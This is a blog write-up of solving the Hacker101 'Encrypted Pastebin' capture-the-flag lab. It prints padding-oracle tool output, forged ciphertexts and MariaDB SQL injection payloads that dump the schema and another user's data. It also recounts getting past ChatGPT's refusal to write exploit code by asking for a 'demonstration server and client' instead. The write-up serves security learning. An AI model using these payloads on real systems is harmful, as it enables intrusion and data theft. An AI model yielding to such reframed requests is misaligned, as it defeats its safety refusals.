Title: Vibe hacking a padding oracle

URL Source: https://beny23.github.io/posts/capturing_a_padding_oracle/

Published Time: 2025-11-09T00:00:00+00:00

Markdown Content:
This post is a mixture of AppSec, vibe coding and cryptography.

> SPOILER ALERT: This post describes how to complete the Capture-The-Flag exercise “Encrypted Pastebin” (Hard) on [Hacker101](https://ctf.hacker101.com/ctf).

Over the last few days I have had a lot of fun with a padding oracle. But let’s take a step back:

I have been looking at Hacker101 CTF exercises. The premise is simple:

*   You’re given a website
*   The website has flags hidden. They look like this `^FLAG^45fe423[..]$FLAG$`.
*   To find the flags you’ll have to find flaws in the website.

So I dimmed the lights, put my hoodie on and started. At first I was presented with this screen

![Image 1: screenshot of encrypted pastebin](https://beny23.github.io/images/capturing_a_padding_oracle_screenshot_encrypted_pastedbin.png)

Military grade eh? If that means “procured from the cheapest bidder” that’s right. Now, AES 128 bit is quite ok for everyday use at the moment, but not exactly state of the art.

How does it work?
-----------------

```
<h1>Encrypted Pastebin</h1>
<p>We've developed the most secure pastebin on the internet.  
   Your data is protected with military-grade 128-bit AES 
   encryption.  The key for your data is never stored in our 
   database, so no hacker can ever gain unauthorized access.</p>
<h2>Post</h2>
<form method="POST">
    Title: <input type="text" name="title"><br>
    <textarea rows="40" cols="80" name="body"></textarea><br>
    <input type="submit" value="Post">
</form>
<img src="tracking.gif">
```

A very basic web application. It’s a basic form that submits the “title” and “body”. Once that’s done it redirects to a URL:

```
https://server_id.ctf.hacker101.com/
   ?post=2FToqCqBYQ8s2G2R7fOUt8FnMvEUOd2qCe6p!v6gMU6jAYpGPEFGmbc9u8tn2sKAt1HWNXtFuM-07CwuKa0Pfh0z9OHItUyjvU8N2t98!Df6EzFzZhbfZnbSCgqg0z02OmpP4R1ilZ8aPYgJipF6uhzsZH8!gbXy0TRmrA9pxi7198N8e3GTPo6UTHJUBkhKdszuRtRpPJs12eUKg7uVhQ~~
```

Which shows entered data:

```
<h1>test title</h1>
<pre>
  test body
</pre>
<img src="tracking.gif">
```

So now if I wanted to share my content with someone else I could just give them the URL.

With the information in the text, I imagined the following:

![Image 2: probably architecture](https://beny23.github.io/images/capturing_a_padding_oracle_probably_architecture.png)

Flag 1
------

I found my first flag very quickly. All it needed was to put in an invalid query parameter:

```
GET https://server_id.ctf.hacker101.com/?post=1

^FLAG^e6a5f6b9e[...]896e81bb3$FLAG$
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 46, in decryptLink
    data = b64d(data)
  File "./common.py", line 11, in <lambda>
    b64d = lambda x: base64.decodestring(
      x.replace('~', '=')
       .replace('!', '/')
       .replace('-', '+'))
  File "/usr/local/lib/python2.7/base64.py", 
    line 328, in decodestring
    return binascii.a2b_base64(s)
Error: Incorrect padding
```

So the flag was in an error message. Ok cool. But the more interesting information was in the associated stack trace. We can see that:

*   the payload is Base64 encoded
*   the encoding is using a custom format, replacing the characters `~!-` with the standard `=/+`
*   the payload is JSON

Flag 2
------

The fact that the stack trace contains some interesting information allows us to try to get to the next stage. So I experimented with payloads:

```
% echo '{"test":"test"}' | base64 | tr '=/+' '~!-'
eyJ0ZXN0IjoidGVzdCJ9Cg~~
```

Submitting that gave me a payload to try against the endpoint which gave me a new stack trace:

```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 49, in decryptLink
    return unpad(cipher.decrypt(data))
  File "./common.py", line 19, in unpad
    padding = data[-1]
IndexError: string index out of range
```

And a payload of `test,1` gave me:

```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 48, in decryptLink
    cipher = AES.new(staticKey, AES.MODE_CBC, iv)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 95, in new
    return AESCipher(key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
    self._cipher = factory.new(key, *args, **kwargs)
ValueError: IV must be 16 bytes long
```

And then I tried with a longer string `12345678901234561234567890123456` which gave me:

```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 49, in decryptLink
    return unpad(cipher.decrypt(data))
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 295, in decrypt
    return self._cipher.decrypt(ciphertext)
ValueError: Input strings must be a multiple of 16 in length
```

I wasn’t quite sure what to do with this information, so I asked ChatGPT:

> Can you help me investigate the following behaviour. I’ve been submitting different inputs to a service and the response contains stack traces:

To which I got an interesting reply:

> Likely vulnerabilities (ranked by seriousness)
> 
> 
> 1.   Information disclosure via verbose stack traces
> 2.   Padding oracle / error oracle exposure
> 3.   Static encryption key + unauthenticated ciphertext
> 4.   Incorrect/unreliable padding handling and Python2 bytes vs str bugs
> 5.   Poor input validation and custom transforms (base64 tweak)
> 
> 
> Why these combine into a practical attack surface
> 
> 
> Distinct exception messages + ability to control input bytes (IV/ciphertext) = oracle. Classic CBC padding oracle attacks exploit exactly this: they send modified ciphertexts and observe whether padding was valid. With repeated probes an attacker can recover plaintext. The stack traces you posted show precisely the different failure modes an attacker could detect and use.

A padding oracle you say?
-------------------------

Now, it is beyond the scope of this post to explain padding oracles, so I got some help from google:

*   [OWASP: Testing for Padding Oracle](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle)
*   [Padding Oracle Hunter](https://github.com/PortSwigger/padding-oracle-hunter/)
*   [Wikipedia: Padding Oracle Attack](https://en.wikipedia.org/wiki/Padding_oracle_attack)

Suffice to say that a padding oracle has the ability to decrypt encrypted text without knowing the encryption key. It just needs requests. Lots of them.

After a bit of searching around I found that none of the tools quite fit what I wanted them to do. So I thought, why not write one myself. And then I thought, a sod it, let’s just ask an LLM.

It’s not what you ask, it’s how you ask
---------------------------------------

If you ask ChatGPT (and I used the default mode, without logging in, I’m a cheapskate) to write you a script to exploit a padding oracle, it will refuse.

> I can’t help write an exploit or any code intended to attack a service. Helping to craft or deliver an active padding-oracle exploit would enable wrongdoing (unauthorized access of systems), so I must refuse.

If ask it to write a demonstration server and client for a padding oracle attack, it is indeed quite helpful.

Here’s what it came up with: [https://github.com/beny23/hackerone-ctf/tree/main/encrypted-pastebin](https://github.com/beny23/hackerone-ctf/tree/main/encrypted-pastebin)

Now, it took quite a few permutations to get it to work and iron out some inefficiencies. But I was actually impressed with what it came up with. I still wanted to throw the laptop out of the window when it kept changing the names of the command line switches.

Finally, I started trying to decrypt the payload:

```
% python padding-oracle.py --decrypt 'payload' --state state.json --workers 4
[client] Launching threaded padding-oracle recovery via GET...
[progress] Block 1/9 Byte 1/16 (from state) -> 0x5e ('^')
[progress] Block 1/9 Byte 2/16 (from state) -> 0x47 ('G')
[progress] Block 1/9 Byte 3/16 (from state) -> 0x41 ('A')
[progress] Block 1/9 Byte 4/16 (from state) -> 0x4c ('L')
[...]
[progress] Block 9/9 Byte 13/16 Requests: 181 Retries: 0 -> Recovered: 0x7e ('~')
[progress] Block 9/9 Byte 14/16 Requests: 178 Retries: 0 -> Recovered: 0x7e ('~')
[progress] Block 9/9 Byte 15/16 Requests: 217 Retries: 0 -> Recovered: 0x67 ('g')
[progress] Block 9/9 Byte 16/16 Requests: 153 Retries: 0 -> Recovered: 0x75 ('u')
[client] Recovered plaintext: b'{
  "flag": "^FLAG^4cc4809ce[..]3b$FLAG$", 
  "id": "4", 
  "key": "zNQ!rEXnxjQBhzLh-kP6ug~~"}'
```

Now, that gave me my second flag. The decrypted post JSON contained a flag. Yey! It was also rather interesting because it contained the key that would be used to encrypt the payload. Which matched the text on the homepage, that the encryption key is not stored. It’s important to add that this key is distinct from the static key used to encrypt the URLs. Each payload is encrypted with a different random key.

It’s also not a quick thing. Each byte needs between 1-255 requests to the web service. Each block has 16 bytes. So decrypting the URL parameters did take a while. Especially as the service would take a few seconds for each request and couldn’t handle many parallel requests.

Flag 3
------

Up until now, we’ve only decrypted payloads that we ourselves had added to the example pastebin service. How could we go further?

Padding oracles are not just able to decrypt payloads, but they can also be used to encrypt. This means I can generate my own payloads. Looking at the structure of the decrypted payload, we could see an “id” and “key” field. I wondered whether I could use that to get other payloads.

```
% python padding-oracle.py --encrypt '{"id": "1"}' --workers 4 
[client] Encrypting plaintext via oracle...
[encrypt] Recovering intermediate D(C_1) for plaintext block 1/1...
[progress] Block 1/1 Byte 1/16 Requests: 24 Retries: 0 -> Recovered: 0x14 ('.')
[progress] Block 1/1 Byte 2/16 Requests: 2 Retries: 0 -> Recovered: 0x01 ('.')
[..]
[progress] Block 1/1 Byte 15/16 Requests: 170 Retries: 0 -> Recovered: 0xa8 ('.')
[progress] Block 1/1 Byte 16/16 Requests: 42 Retries: 0 -> Recovered: 0x3a (':')
[client] Ciphertext (custom-base64): QYrZEj0wp[..]]uCYm1k3fOo~
```

When I then sent that off to the service I got flag number 3:

```
Attempting to decrypt page with title: ^FLAG^8b1f33[..]]a69e65$FLAG$
Traceback (most recent call last):
  File "./main.py", line 74, in index
    body = decryptPayload(post['key'], body)
KeyError: 'key'
```

Helpfully, the service shows the title of an entry when passing in the id. In the real world, this might have been a way of debugging that never got removed.

Flag 4
------

Getting the last flag was a little more complicated. To cut a long story short, I discovered that the id field had a SQL injection vulnerability.

First I got my SQL syntax a bit wrong:

```
% python padding-oracle.py --encrypt $'{"id":"2\' or \'1\'=\'1",
  "key": "2YWjdCO616G47N2-Kqd2ww~~"}' --workers 4
[client] Encrypting plaintext via oracle...
[encrypt] Recovering intermediate D(C_4) for plaintext block 4/4...
[progress] Block 4/4 Byte 1/16 Requests: 56 Retries: 0 -> Recovered: 0x38 ('8')
[progress] Block 4/4 Byte 2/16 Requests: 43 Retries: 0 -> Recovered: 0x29 (')')
[..]
[progress] Block 1/4 Byte 15/16 Requests: 51 Retries: 0 -> Recovered: 0x3d ('=')
[progress] Block 1/4 Byte 16/16 Requests: 63 Retries: 0 -> Recovered: 0x2e ('.')
[client] Ciphertext (custom-base64): VR8n-fUckUwAGx4LPuOa[..]]SO4~

% curl 'https://server_id.ctf.hacker101.com?post=VR8n-fUckUwAGx[..]xFObn2QzizunqoIXrSO4~'
Traceback (most recent call last):
  File "./main.py", line 71, in index
    if cur.execute('SELECT title, body FROM posts WHERE id=%s' % post['id']) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; 
  check the manual that corresponds to your MariaDB server version 
  for the right syntax to use near '' or '1'='1' at line 1")
```

This gave me two pieces of information:

*   the query being used which told me the table name and the column names
*   the database being used (MariaDB)

This is useful, because I could then experiment with writing SQL injection on a site like [SQLFiddle](https://sqlfiddle.com/) using the right database.

SQLi cul-de-sac
---------------

So my initial thought was, because the server code leaked the title in the error message I could use SQL injection to extract the body:

I used a parameter of

```
0 union select body, title FROM posts where id=1
```

This way the query would be:

```
select title, body
   from posts
  where id = 0
union
 select body, title
   from posts
  where id = 1
```

This would return a single row and the error message would leak the data for me:

It worked! Well, sort of.

```
% curl 'https://server_id.ctf.hacker101.com?post=0cyg6z9m6BCTV!oohCM!!7OQOjm[..]60I-OgCw~~'
Attempting to decrypt page with title: odFZbP-NggUpoMbKiRuT03rC-hgz9jGEmk81mfFnT1fI0RJ2MYkJQL1uPdCa2nihi6zki-!n0NXtG7cjxYYD0tewPqU2gD0KqeFSeiwzEGOuKuvhbWTqVORfXrRIX0at
Traceback (most recent call last):
  File "./main.py", line 74, in index
    body = decryptPayload(post['key'], body)
  File "./common.py", line 37, in decryptPayload
    return unpad(cipher.decrypt(data))
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 295, in decrypt
    return self._cipher.decrypt(ciphertext)
ValueError: Input strings must be a multiple of 16 in length
```

So I got the raw payload, but failed the encryption. This was because the JSON payload looks like this:

```
1
2
3
4
5
``````
{
  "flag": "^FLAG^4cc4809ce[..]3b$FLAG$", 
  "id": "4", 
  "key": "zNQ!rEXnxjQBhzLh-kP6ug~~"
}
```

The key is randomly generated. And never stored on the server. What to do?

I (very) briefly thought that possibly another padding oracle attack could work. But that was going to take forever, because in order to try a single key, I’d have to run the padding oracle to encrypt the payload, which takes on average 128 requests for a single byte. Not practical.

Exploring the database
----------------------

I was thinking, I had a way of extracting information from the database, why don’t I look around to see what else is there?

That’s when I went back to ChatGPT. I asked it for a way to aggregate information in MariaDB so that multiple rows and columns could be returned as a single field.

This is what it came up with:

```
0 
union 
SELECT GROUP_CONCAT(
  CONCAT(
    table_schema,':',
    table_name,':',
    column_name,':',
    column_type)
  ), 
  'x' 
  FROM information_schema.columns 
 where table_schema!='information_schema'
```

Off my little oracle went:

```
% python padding-oracle.py --encrypt $'{"id":"0 union SELECT GROUP_CONCAT(CONCAT(table_schema,\':\',table_name,\':\',column_name,\':\',column_type)), \'x\' FROM information_schema.columns where table_schema!=\'information_schema\'","key": "2YWjdCO616G47N2-Kqd2ww~~"}' --workers 4
[client] Encrypting plaintext via oracle...
[encrypt] Recovering intermediate D(C_14) for plaintext block 14/14...
[progress] Block 14/14 Byte 1/16 Requests: 213 Retries: 0 -> Recovered: 0xd5 ('.')
[..]
[progress] Block 1/14 Byte 15/16 Requests: 44 Retries: 0 -> Recovered: 0x22 ('"')
[progress] Block 1/14 Byte 16/16 Requests: 203 Retries: 0 -> Recovered: 0xda ('.')
[client] Ciphertext (custom-base64): oQA4Snsw4UojribiBpZ[..]8Eljp
```

28,827 requests later I had my payload. And when I ran that:

```
% curl 'https://server_id.ctf.hacker101.com/?post=oQA4Snsw4UojribiB[..]jBYY8Eljp'
Attempting to decrypt page with title: 
  level3:posts:id:int(11),
  level3:posts:title:text,
  level3:posts:body:mediumtext,
  level3:tracking:id:int(11),
  level3:tracking:headers:mediumtext,
  mysql:column_stats:db_name:varchar(64),
  mysql:column_stats:table_name:varchar(64),
  [..]
Traceback (most recent call last):
  File "./main.py", line 74, in index
    body = decryptPayload(post['key'], body)
  File "./common.py", line 34, in decryptPayload
    data = b64d(data)
  File "./common.py", line 11, in <lambda>
    b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
  File "/usr/local/lib/python2.7/base64.py", line 328, in decodestring
    return binascii.a2b_base64(s)
Error: Incorrect padding
```

So now I knew:

*   the name of the schema
*   the name of two tables (posts and tracking)
*   the column names and types

Tracking?
---------

Where would tracking come into place? Well, if you look back at the response when decrypting:

```
<h1>test title</h1>
<pre>
  test body
</pre>
<img src="tracking.gif">
```

There’s a tracking image. The image itself is just a 1-pixel GIF. But what may hide in the tracking table?

So let’s inject some more SQL:

```
0 
union 
select 
  GROUP_CONCAT(CONCAT(id,':',headers)), 
  '' 
 from tracking
```

Again, some time later using the padding oracle attack, we got our output:

```
% curl 'https://server_id.ctf.hacker101.com/?post=4qZgAs9fLYMsaI9YR[..]
Attempting to decrypt page with title: 
1:Referer: http://127.0.0.1:14807/?post=JgYvMmP8TbmTddC0[..]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Connection: close
Host: 127.0.0.1:14807
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate

,
2:Referer: https://server_id.ctf.hacker101.com/
X-Forwarded-Port: 443
Priority: u=5, i
User-Agent: Mozilla/5.0 [..]
Connection: close
Sec-Fetch-Dest: image
X-Amzn-Trace-Id: Root=1-69105305-2fdb39d310549ba50134fc6b
X-Forwarded-Proto: https
Sec-Fetch-Mode: no-cors
Host: server+id.ctf.hacker101.com
Sec-Fetch-Site: same-origin
Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8
Traceback (most recent call last):
  File "./main.py", line 74, in index
    body = decryptPayload(post['key'], body)
  File "./common.py", line 36, in decryptPayload
    cipher = AES.new(b64d(key), AES.MODE_CBC, iv)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 95, in new
    return AESCipher(key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
    self._cipher = factory.new(key, *args, **kwargs)
ValueError: IV must be 16 bytes long
```

Turns out the tracking table stores all the request headers from requests made to “tracking.gif”. And we had two rows in there. One (id=2) is our request. And another one made to a URL to 127.0.0.1 with the encrypted post payload.

Let’s try that:

```
% curl 'https://server_id.ctf.hacker101.com/?post=4qZgAs9fLYMsaI9YR[..]
<html>
  <head>
    <title>^FLAG^8b1f3342d[..]0ba69e65$FLAG$ -- Encrypted Pastebin</title>
  </head>
  <body>
    <h1>^FLAG^8b1f3342df6e[..]9e65$FLAG$</h1>
    <pre>
      ^FLAG^cc500372296[..]0a5541b55e1$FLAG$
    </pre>
    <img src="tracking.gif">
  </body>
</html>
```

And there we have it. Flag 4. Exfiltration of someone elses encrypted payload without needing to know their encryption key.

Conclusion
----------

This Hacker101 CTF was a lot of fun as it combined:

*   encryption
*   padding oracles
*   SQL injection
*   data exfiltratoin

It demonstrates what can go wrong when a service

*   leaks stack traces
*   has overly verbose error messages
*   uses outdated encryption (CBC shouldn’t be used anymore)
*   leaks keys in URLs
*   doesn’t protect tracking information

I also found it a lot of fun and frustrating at the same time to vibe-code the python script running the padding oracle attack. It was quite useful to be able to add features around printing status messages and getting the algorithm right without too much thinking. The fact that the guardrails against writing exploit code (“help me create a demo server”) were easily circumvented doesn’t really surprise me.

For me I’d always wondered what was behind those vulnerability CVEs on padding oracles. Now I understand the impact a lot better. And having a way to decrypt payloads without needing to know the key is rather neat!

I hope you enjoyed following along!

**Tags**[appsec](https://beny23.github.io/tags/appsec/)[ctf](https://beny23.github.io/tags/ctf/)[cryptography](https://beny23.github.io/tags/cryptography/)

If you'd like to find more of my writing, why not follow me on [Bluesky](https://bsky.app/profile/beny23.github.io "BlueSky link") or [Mastodon](https://infosec.exchange/@beny23 "Mastodon link")?